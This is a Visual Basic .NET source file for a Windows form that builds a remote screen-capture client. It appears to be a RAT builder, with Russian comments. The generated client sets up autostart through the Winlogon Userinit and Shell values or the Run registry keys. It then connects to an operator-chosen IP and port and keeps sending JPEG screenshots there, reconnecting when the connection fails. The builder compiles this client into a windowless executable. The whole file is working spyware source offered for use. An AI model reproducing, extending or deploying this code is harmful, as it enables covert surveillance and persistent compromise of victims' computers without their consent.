Imports System
Imports System.Net.Sockets
Imports System.IO
Imports System.CodeDom
Imports System.CodeDom.Compiler
Imports Microsoft.VisualBasic
Imports System.Text

Public Class Builder
    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        autoCb.Items.Add("Userinit")
        autoCb.Items.Add("HKLM:Run")
        autoCb.Items.Add("HKCU:Run")
        autoCb.Items.Add("Shell")
        autoCb.DropDownStyle = ComboBoxStyle.DropDownList
    End Sub

    Private Sub autoCheck_CheckedChanged(sender As Object, e As EventArgs) Handles autoCheck.CheckedChanged
        autoCb.Enabled = autoCheck.Checked
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Dim ip As String = ipTxt.Text
        Dim port As String = portTxt.Text
        Dim clientCode As String = GenerateClientCode(ip, port)
        SaveAndCompileCode(clientCode)
    End Sub

    Private Function GenerateClientCode(ip As String, port As String) As String
        Dim autostartCode As String = ""

        If autoCheck.Checked AndAlso autoCb.SelectedItem IsNot Nothing Then
            Dim selected As String = autoCb.SelectedItem.ToString()
            Select Case selected
                Case "Userinit"
                    autostartCode = "
        Try
            Dim key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(""SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"", True)
            Dim currentValue As String = key.GetValue(""Userinit"", """").ToString()
            If Not currentValue.Contains(System.Reflection.Assembly.GetExecutingAssembly().Location) Then
                key.SetValue(""Userinit"", currentValue & "","" & System.Reflection.Assembly.GetExecutingAssembly().Location)
            End If
        Catch ex As Exception
        End Try
"
                Case "HKLM:Run"
                    autostartCode = "
        Try
            Dim key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", True)
            key.SetValue(""MyApp"", System.Reflection.Assembly.GetExecutingAssembly().Location)
        Catch ex As Exception
        End Try
"
                Case "HKCU:Run"
                    autostartCode = "
        Try
            Dim key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(""Software\Microsoft\Windows\CurrentVersion\Run"", True)
            key.SetValue(""MyApp"", System.Reflection.Assembly.GetExecutingAssembly().Location)
        Catch ex As Exception
        End Try
"
                Case "Shell"
                    autostartCode = "
        Try
            Dim key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(""SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"", True)
            Dim currentShell As String = key.GetValue(""Shell"", ""explorer.exe"").ToString()
            Dim exePath As String = System.Reflection.Assembly.GetExecutingAssembly().Location
            If Not currentShell.Contains(exePath) Then
                key.SetValue(""Shell"", currentShell & "" "" & exePath)
            End If
        Catch ex As Exception
        End Try
"
            End Select
        End If

        ' Сгенерированный клиентский код с функционалом захвата экрана, отправкой данных серверу и отладочными сообщениями
        Dim generatedCode As String = $"Imports System
Imports System.Net.Sockets
Imports System.IO
Imports Microsoft.Win32
Imports System.Threading
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Windows.Forms

Namespace ClientApp
    Public Class Client
        Public Shared Sub Main()
            {autostartCode}
            ' Отладочное сообщение о запуске клиента
            MessageBox.Show(""Клиент запущен"", ""Debug"")
            Do
                Try
                    Dim client As New TcpClient()
                    client.Connect(""{ip}"", {port})
                    ' Сообщение об успешном подключении к серверу
                    MessageBox.Show(""Подключено к серверу {ip}:{port}"", ""Debug"")
                    Dim stream As NetworkStream = client.GetStream()
                    ' В бесконечном цикле отправляем текущий снимок экрана
                    While client.Connected
                        Dim bmp As Bitmap = CaptureScreen()
                        Using ms As New MemoryStream()
                            bmp.Save(ms, ImageFormat.Jpeg)
                            Dim imageBytes() As Byte = ms.ToArray()
                            Dim lengthBytes() As Byte = BitConverter.GetBytes(imageBytes.Length)
                            stream.Write(lengthBytes, 0, lengthBytes.Length)
                            stream.Write(imageBytes, 0, imageBytes.Length)
                        End Using
                        bmp.Dispose()
                        Thread.Sleep(100)
                    End While
                Catch ex As Exception
                    ' Отладочное сообщение об ошибке
                    MessageBox.Show(""Ошибка: "" & ex.Message, ""Debug"")
                End Try
                Thread.Sleep(5000)
            Loop
        End Sub

        Private Shared Function CaptureScreen() As Bitmap
            Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
            Dim bmp As New Bitmap(bounds.Width, bounds.Height)
            Using g As Graphics = Graphics.FromImage(bmp)
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size)
            End Using
            Return bmp
        End Function
    End Class
End Namespace"
        Return generatedCode
    End Function

    Private Sub SaveAndCompileCode(code As String)
        Dim saveFileDialog As New SaveFileDialog()
        saveFileDialog.Filter = "Executable Files|*.exe"
        saveFileDialog.Title = "Сохранить клиентский файл"
        If saveFileDialog.ShowDialog() = DialogResult.OK Then
            Dim filePath As String = saveFileDialog.FileName
            CompileCode(code, filePath)
        End If
    End Sub

    Private Sub CompileCode(code As String, filePath As String)
        Dim provider As New Microsoft.VisualBasic.VBCodeProvider()
        Dim options As New CompilerParameters()

        options.GenerateExecutable = True
        options.OutputAssembly = filePath
        options.CompilerOptions = "/target:winexe"

        ' Добавляем необходимые сборки
        options.ReferencedAssemblies.Add("System.dll")
        options.ReferencedAssemblies.Add("System.Core.dll")
        options.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        options.ReferencedAssemblies.Add("System.Drawing.dll")
        options.ReferencedAssemblies.Add("System.Windows.Forms.dll")

        Dim results As CompilerResults = provider.CompileAssemblyFromSource(options, code)
        If results.Errors.HasErrors Then
            Dim sb As New StringBuilder()
            For Each err As CompilerError In results.Errors
                sb.AppendLine("Ошибка: " & err.ErrorText)
            Next
            ShowLogWindow(sb.ToString())
        Else
            MessageBox.Show("Клиентская часть успешно скомпилирована!")
        End If
    End Sub

    ''' <summary>
    ''' Создаёт и отображает окно логов с переданным текстом.
    ''' </summary>
    ''' <param name="logText">Текст логов</param>
    Private Sub ShowLogWindow(logText As String)
        Dim logForm As New Form()
        logForm.Text = "Логи компиляции"
        logForm.Size = New Drawing.Size(600, 400)
        Dim txtLogs As New TextBox()
        txtLogs.Multiline = True
        txtLogs.ReadOnly = True
        txtLogs.ScrollBars = ScrollBars.Vertical
        txtLogs.Dock = DockStyle.Fill
        txtLogs.Font = New Drawing.Font("Consolas", 10)
        txtLogs.Text = logText
        logForm.Controls.Add(txtLogs)
        logForm.ShowDialog()
    End Sub
End Class
